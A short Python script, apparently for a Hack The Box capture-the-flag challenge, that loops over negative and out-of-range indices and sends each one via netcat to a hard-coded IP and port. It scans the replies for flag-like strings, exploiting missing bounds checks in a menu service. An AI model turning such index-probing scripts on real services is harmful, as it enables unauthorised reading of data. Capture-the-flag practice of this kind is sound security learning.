#!/usr/bin/env python3

import subprocess
import time

def test_index(index):
    try:
        cmd = f'echo -e "{index}\\ntest" | timeout 5 nc 94.237.57.211 45459'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "You've chosen:" in result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if "You've chosen:" in line:
                    chosen = line.split("You've chosen:")[1].strip()
                    if chosen and chosen != "":
                        print(f"Índice {index}: '{chosen}'")
                        if "HTB" in chosen or "flag" in chosen or "{" in chosen:
                            print(f"*** POSIBLE FLAG ENCONTRADA EN ÍNDICE {index}: {chosen} ***")
                            return chosen
        
        time.sleep(0.1)  # Para no saturar el servidor
        return None
        
    except Exception as e:
        print(f"Error con índice {index}: {e}")
        return None

if __name__ == "__main__":
    print("Probando diferentes índices...")
    
    # Probar índices negativos
    for i in range(-100, -1):
        result = test_index(i)
        if result:
            break
    
    # Probar índices positivos grandes
    for i in range(10, 200):
        result = test_index(i)
        if result:
            break